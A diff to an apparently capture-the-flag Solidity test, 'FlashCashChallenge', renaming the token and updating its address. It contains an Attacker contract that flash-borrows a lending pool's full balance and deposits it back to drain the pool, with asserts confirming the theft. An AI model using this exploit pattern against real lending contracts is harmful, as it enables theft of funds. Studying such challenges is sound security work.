@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+pragma solidity 0.8.23;
 
 import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
@@ -25,13 +25,13 @@ contract Attacker is IFlashLoanEtherReceiver {
     }
 
     function flashloan() public {
-        uint256 _balance = IERC20(lendingPool.CRDNA()).balanceOf(address(lendingPool));
+        uint256 _balance = IERC20(lendingPool.DNVR()).balanceOf(address(lendingPool));
         lendingPool.flashLoan(_balance);
     }
 
     function execute() external override {
-        uint256 _balance = IERC20(lendingPool.CRDNA()).balanceOf(address(this));
-        IERC20(lendingPool.CRDNA()).approve(address(lendingPool), _balance);
+        uint256 _balance = IERC20(lendingPool.DNVR()).balanceOf(address(this));
+        IERC20(lendingPool.DNVR()).approve(address(lendingPool), _balance);
         lendingPool.deposit(_balance);
     }
 }
@@ -42,7 +42,7 @@ contract FlashCashChallenge is Test {
 
     LendingPool private _lendingPool;
 
-    IERC20 public constant CRDNA = IERC20(0x94ab230b92A3f2899e81d46d4E874c6F006c88Aa);
+    IERC20 public constant DNVR = IERC20(0x84BbB983D8cF2F58bd9b2dE794a489d2e9798668);
 
     function setUp() external {
 
@@ -58,10 +58,10 @@ contract FlashCashChallenge is Test {
 
         /** PRE ATTACK ASSERTS */
 
-        assertTrue(CRDNA.balanceOf(address(_lendingPool)) > 0, "FlashCashChallenge: LendingPool has no balance");
-        assertTrue(CRDNA.balanceOf(address(_attacker)) == 0, "FlashCashChallenge: attacker already has a balance");
+        assertTrue(DNVR.balanceOf(address(_lendingPool)) > 0, "FlashCashChallenge: LendingPool has no balance");
+        assertTrue(DNVR.balanceOf(address(_attacker)) == 0, "FlashCashChallenge: attacker already has a balance");
 
-        uint256 _lendingPoolBalanceBefore = CRDNA.balanceOf(address(_lendingPool));
+        uint256 _lendingPoolBalanceBefore = DNVR.balanceOf(address(_lendingPool));
 
         /** ATTACK */
 
@@ -70,7 +70,7 @@ contract FlashCashChallenge is Test {
 
         /** POST ATTACK ASSERTS */
 
-        assertTrue(CRDNA.balanceOf(address(_attacker)) >= _lendingPoolBalanceBefore, "FlashCashChallenge: attacker did not steal enough");
-        assertTrue(CRDNA.balanceOf(address(_lendingPool)) == 0, "FlashCashChallenge: LendingPool still has a balance");
+        assertTrue(DNVR.balanceOf(address(_attacker)) >= _lendingPoolBalanceBefore, "FlashCashChallenge: attacker did not steal enough");
+        assertTrue(DNVR.balanceOf(address(_lendingPool)) == 0, "FlashCashChallenge: LendingPool still has a balance");
     }
 }
